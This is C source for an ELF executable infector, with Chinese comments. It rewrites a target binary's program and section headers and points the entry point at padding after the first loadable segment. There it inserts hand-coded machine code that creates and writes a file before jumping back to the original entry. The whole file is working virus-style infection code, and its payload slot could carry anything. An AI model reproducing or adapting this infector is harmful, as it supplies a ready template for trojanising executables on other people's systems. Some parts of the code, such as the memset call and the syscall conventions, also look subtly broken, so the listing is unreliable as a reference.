#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

//一页的大小，默认 4K
#define PAGESIZE 4096

// 计算新的地址，如：数据段地址，跳转地址等
void cal_addr(int value, int arr[]);
// 注入函数
void inject(char *elf_file);
// 插入函数
void insert(Elf64_Ehdr elf_ehdr, int old_file, int old_entry, int old_phsize);

// 计算新的地址
void cal_addr(int value, int arr[])
{
    int a = value / (16 * 16);
    int b = value % (16 * 16);
    int a2 = a / (16 * 16);
    int b2 = a % (16 * 16);

    arr[0] = b;
    arr[1] = b2;
    arr[2] = a2;
}
// 判断是否是一个 ELF 文件
int is_elf(Elf64_Ehdr elf_ehdr)
{
    // ELF文件头部的 e_ident 为 "0x7fELF"
    if ((strncmp(elf_ehdr.e_ident, ELFMAG, SELFMAG)) != 0)
        return 0;
    else
        return 1; // 相等时则是
}

//Infector Function
void inject(char *elf_file)
{
    printf("开始注入\n");
    int old_entry;
    int old_shoff;
    int old_phsize;

    // ELF Header Table 结构体
    Elf64_Ehdr elf_ehdr;
    // Program Header Table 结构体
    Elf64_Phdr elf_phdr;
    // Section Header Table 结构体
    Elf64_Shdr elf_shdr;

    // 打开文件并读取ELF头信息到 elf_ehdr 上
    int old_file = open(elf_file, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(elf_ehdr));

    // 判断是否是一个 ELF 文件
    if (!is_elf(elf_ehdr))
    {
        printf("此文件不是 ELF 文件\n");
        exit(0);
    }

    // elf 文件的原入口地址
    old_entry = elf_ehdr.e_entry;
    //elf 文件 节区头部表格的原偏移量
    old_shoff = elf_ehdr.e_shoff;

    // 节区头部表格的偏移量增加一页
    elf_ehdr.e_shoff += PAGESIZE;

    int flag = 0;
    int i = 0;

    printf("开始修改程序头部表\n");
    // 读取并修改程序头部表
    for (i = 0; i < elf_ehdr.e_phnum; i++)
    {
        // 寻找并读取到 elf_phdr 中
        lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
        read(old_file, &elf_phdr, sizeof(elf_phdr));
        if (flag)
        {
            // 增加 p_offset 一页大小 4k
            elf_phdr.p_offset += PAGESIZE;
            // 寻找并更新 程序头部
            lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
            write(old_file, &elf_phdr, sizeof(elf_phdr));
        }
        else if (PT_LOAD == elf_phdr.p_type && elf_phdr.p_offset == 0)
        { // 数组元素可加载的段，程序段入口

            if (elf_phdr.p_filesz != elf_phdr.p_memsz)
                exit(0);

            // 修改新的程序入口虚拟地址
            elf_ehdr.e_entry = elf_phdr.p_vaddr + elf_phdr.p_filesz;
            // 寻找并更新 ELF 头部
            lseek(old_file, 0, SEEK_SET);
            write(old_file, &elf_ehdr, sizeof(elf_ehdr));
            old_phsize = elf_phdr.p_filesz;

            // 增加 p_filesz 和 p_memsz 一页大小 4k
            elf_phdr.p_filesz += PAGESIZE;
            elf_phdr.p_memsz += PAGESIZE;

            // 更新程序头部表
            lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
            write(old_file, &elf_phdr, sizeof(elf_phdr));
            flag = 1;
        }
    }

    printf("开始修改节区头部表\n");
    // 读取并修改节区头部表
    for (i = 0; i < elf_ehdr.e_shnum; i++)
    {
        // 寻找并读取节区头部表
        lseek(old_file, i * sizeof(elf_shdr) + old_shoff, SEEK_SET);
        read(old_file, &elf_shdr, sizeof(elf_shdr));
        if (i == 0)
        {
            // 第一个节区增加一页
            elf_shdr.sh_size += PAGESIZE;
        }
        else
        {
            // 节区偏移地址增加一页
            elf_shdr.sh_offset += PAGESIZE;
        }
        // 寻找并更新节区头部表
        lseek(old_file, old_shoff + i * sizeof(elf_shdr), SEEK_SET);
        write(old_file, &elf_shdr, sizeof(elf_shdr));
    }

    printf("开始插入注入程序\n");
    // 插入注入程序
    insert(elf_ehdr, old_file, old_entry, old_phsize);
}

void insert(Elf64_Ehdr elf_ehdr, int old_file, int old_entry, int old_phsize)
{
    // 程序的原始入口地址
    int old_entry_addr[3];
    cal_addr(old_entry, old_entry_addr);

    // 数据段的地址, 73 为数组中程序数据段的相对位置
    int data_entry = elf_ehdr.e_entry + 73;
    int data_addr[3];
    cal_addr(data_entry, data_addr);

    // 每一行对应一条汇编代码
    char inject_code[] = {
        0x50,
        0x53,
        0x51,
        0x52,
        0x48, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc3, data_addr[0], data_addr[1], data_addr[2], 0x00,
        0x48, 0xc7, 0xc1, 0xa4, 0x01, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0x89, 0xc3,
        0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc1, data_addr[0], data_addr[1], data_addr[2], 0x00,
        0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0xc7, 0xc0, 0x06, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x5a,
        0x59,
        0x5b,
        0x58,
        //跳转指令 "movl Oldentry, %eax"
        0xbd, old_entry_addr[0], old_entry_addr[1], old_entry_addr[2], 0x00, 0xff, 0xe5,
        //数据区域 hhhhh
        0x68, 0x68, 0x68, 0x68, 0x68, 0x00};
    int inject_size = sizeof(inject_code);

    // 防止注入代码太大
    if (inject_size > (PAGESIZE - (elf_ehdr.e_entry % PAGESIZE)))
    {
        printf("注入代码太大\n");
        exit(0);
    }

    struct stat file_stat;
    fstat(old_file, &file_stat);
    char *data = (char *)malloc(file_stat.st_size - old_phsize);

    // 存储原程序从节区末尾到目标节区头的数据
    lseek(old_file, old_phsize, SEEK_SET);
    read(old_file, data, file_stat.st_size - old_phsize);

    // 插入注入代码到原 elf 文件中
    lseek(old_file, old_phsize, SEEK_SET);
    write(old_file, inject_code, inject_size);

    char tmp[PAGESIZE] = {0};
    // 扩充到一页
    memset(tmp, PAGESIZE - inject_size, 0);
    write(old_file, tmp, PAGESIZE - inject_size);
    write(old_file, data, file_stat.st_size - old_phsize);
    free(data);
}

int main(int argc, char **argv)
{
    //检查参数数量是否正确
    if (argc != 2)
    {
        printf("缺少 elf 文件参数，格式：./main <elf_filepath>\n");
        exit(0);
    }
    inject(argv[1]);
    return 0;
}
